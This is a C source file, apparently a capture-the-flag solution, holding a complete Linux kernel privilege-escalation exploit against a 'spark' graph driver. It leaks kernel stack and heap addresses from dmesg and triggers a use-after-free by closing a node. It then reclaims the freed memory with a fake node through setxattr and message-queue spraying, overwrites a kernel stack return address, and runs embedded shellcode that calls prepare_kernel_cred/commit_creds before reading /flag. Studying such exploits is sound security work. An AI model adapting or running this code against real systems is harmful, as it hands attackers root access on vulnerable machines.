#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <poll.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <sys/xattr.h>
#include <sys/klog.h>

#define SPARK_LINK        0x4008D900
#define SPARK_QUERY       0xC010D903
#define SPARK_GETINFO     0x8018D901
#define SPARK_FINALIZE    0xD902
#define DEV_PATH "/dev/node"

#define N 0x20
static int fd[N];

//mov    rbx,QWORD PTR [rsp+0x10]
//sub    rbx,0x3f2149
//mov    rcx,rbx
//xor    rdi,rdi
//call   rcx ; prepare_kernel_cred
//mov    rdi,rax
//mov    rdx,rbx
//sub    rdx,0x470
//call   rdx ; commit_cred
//add    rsp,0x20
//pop    rbx
//pop    r12
//pop    r13
//pop    r14
//pop    r15
//pop    rbp
//ret
char * shellcode = "\x48\x8B\x5C\x24\x10\x48\x81\xEB\x49\x21\x3F\x00\x48\x89\xD9\x48\x31\xFF\xFF\xD1\x48\x89\xC7\x48\x89\xDA\x48\x81\xEA\x70\x04\x00\x00\xFF\xD2\x48\x83\xC4\x20\x5B\x41\x5C\x41\x5D\x41\x5E\x41\x5F\x5D\xC3";

struct spark_ioctl_query {
  int fd1;
  int fd2;
  long long distance;
};

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

static void link_(int a, int b, unsigned int weight) {
  int r = ioctl(fd[a], SPARK_LINK, fd[b] | ((unsigned long long) weight << 32));
}

static void query(int a, int b, int c) {
  struct spark_ioctl_query qry = {
    .fd1 = fd[b],
    .fd2 = fd[c],
  };
  int r = ioctl(fd[a], SPARK_QUERY, &qry);
}

static void getinfo(int a) {
  unsigned long arr[3];
  int r = ioctl(fd[a], SPARK_GETINFO, &arr);
}

static void finalize(int a) {
  int r = ioctl(fd[a], SPARK_FINALIZE);
}

int main(int argc, char *argv[]) {
  if(argc > 2){
      printf("[*] spawned child process\n");
      printf("[*] trigger crash for kernel leak\n");
      //for leak
      // Open vulnerable driver
      for(int i = 0; i < 3; i++) {
        fd[i] = open(DEV_PATH, O_RDWR);
      }
      link_(0, 1, 0xdeadbeef);
      close(fd[0]);
      finalize(1);
      return 0;
  }
  else {
    char * argv[3];
    argv[0] = "1";
    argv[1] = "1";
    argv[2] = "1";
    argv[3] = NULL;
    
    printf("[*] spawn process for kernel leak\n");
    system("/home/spark/exp* 1 2 3");
  }

  //prepare userland kernel-shellcode
  mprotect((void *)((unsigned long)shellcode & ~0xfff), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC);
  printf("[+] kernel shellcode in %p\n", shellcode);

  printf("[*] get kernel leak by reading kernel buf...\n");

  char buf[0x1000];

  //read dmesg log
  int n = klogctl(3, buf, sizeof(buf));
  char *ptr, *pptr;

  //why we need kern base when we get kernel stack leak!!
  ptr = buf;
  while (ptr != NULL) {
    pptr = ptr;
    ptr = strstr(ptr + 1, "RSP:"); 
  }
  pptr[26] = '\0';
  pptr[8] = '0';
  pptr[9] = 'x';
  
  unsigned long kern_stack = strtoull(&pptr[8], &ptr, 16);

  n = klogctl(3, buf, sizeof(buf));
  ptr = buf;
  while (ptr != NULL) {
    pptr = ptr;
    ptr = strstr(ptr + 1, "R11:"); 
  }
  pptr[21] = '\0';
  pptr[3] = '0';
  pptr[4] = 'x';

  unsigned long kern_heap = strtoull(&pptr[3], &ptr, 16);
  printf("[+] kernel stack : %p\n", (void *)kern_stack);
  printf("[+] kernel heap : %p\n", (void *)kern_heap);


  int qid;
  if ((qid = msgget(123, 0666|IPC_CREAT)) == -1) {
    perror("msgget");
    exit(1);
  }
  struct {
    long mtype;
    char mtext[0x80 - 0x30];
  } msgbuf;
  msgbuf.mtype = 1;
  memset(msgbuf.mtext, 0x41, sizeof(msgbuf.mtext));

  printf("[*] create %d node to clear 0x80 kernel heap bin\n", N);

  // Open vulnerable driver
  for(int i = 0; i < N; i++) {
    fd[i] = open(DEV_PATH, O_RDWR);
  }

  //value to write
  //should be smaller then 0x7FFFFFFFFFFFFFFF (thus no kernel addr)
  //no matter with no smep/smap! aren't we...?
  unsigned long long value = (unsigned long long)shellcode;

  
  printf("[*] construct graph & trigger UAF by release node 0\n");
  
  // 16 links -> 8 * 16 = 0x80 dist_array on query
  link_(1, 3, 0x7fff1);
  link_(3, 4, 0x7ffff2);
  link_(4, 5, 0x7ff0);
  link_(5, 6, 0x7fffffe);
  link_(6, 7, 0x7ffe);
  link_(7, 8, 0x7ffffe);
  link_(8, 9, 0x7fffffe);
  link_(9, 10, 0x7ffffe);
  link_(10, 11, 0x7fffffe);
  link_(11, 12, 0x7ffffe);
  link_(12, 13, 0x7ffffffe);
  link_(13, 14, 0x7e);
  link_(14, 15, 0x7);
  link_(15, 16, 2);
  link_(16, 17, 1);
  link_(0, 1, value);
  close(fd[0]);

  unsigned long long write_target = kern_stack - 0xfeb0;
  printf("[+] write target (kernel stack ret) : %p\n", (void *)write_target);

  unsigned long long fake_node[0x10];
  fake_node[0] = 0xffffffffdead0000; // node_cnt
  fake_node[1] = 1; // refcount
  fake_node[2] = 0; // state_lock (mutex)
  fake_node[3] = 0xffffffffdead3000;
  fake_node[4] = 0xffffffffdead4000;
  fake_node[5] = 0xffffffffdead5000;
  fake_node[6] = 1; // finalized
  fake_node[7] = 0xffffffffdead7000; // nb_lock (mutex)
  fake_node[8] = 0xffffffffdead8000;
  fake_node[9] = 0xffffffffdead9000;
  fake_node[10]= 0xffffffffdeada000; // nb_lock
  fake_node[11]= 0x1; // link_count
  fake_node[12]= 0; // link_prev
  fake_node[13]= 0xffffffffdeadd000; // link_end

  //dist_arr[v16->target->idx_in_final] = value;
  fake_node[14]= (write_target - kern_heap) / sizeof(unsigned long long); // idx_in_final
  
  fake_node[15]= 0xffffffffdeadf000; // final_res

  for(int i = 0; i < 0x12; i++) {
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext), 0) == -1) {
      perror("msgsnd");
      return 1;
    }
  }

  printf("[*] retain node 0 with setxattr -> make fake node\n");
  setxattr("/tmp", "ptr", fake_node, 0x80, XATTR_CREATE);

  printf("[*] free previous node for deterministic heap addr\n");
  close(fd[2]);
  
  printf("[*] finalize the graph\n");
  finalize(1);

  printf("[*] send query to trigger heap-based write\n");
  printf("[*] ...and overwrite kernel stack & ret2user\n");
  query(1, 1, 3);

  printf("[*] trying to read flag...\n");
  int flag_fd = open("/flag",O_RDONLY);
  if(flag_fd == -1){
    printf("[-] flag open failed...\n");
    exit(1);
  }
  read(flag_fd, buf, sizeof(buf));
  printf("[+] flag : %s\n", buf);
  return 0;
}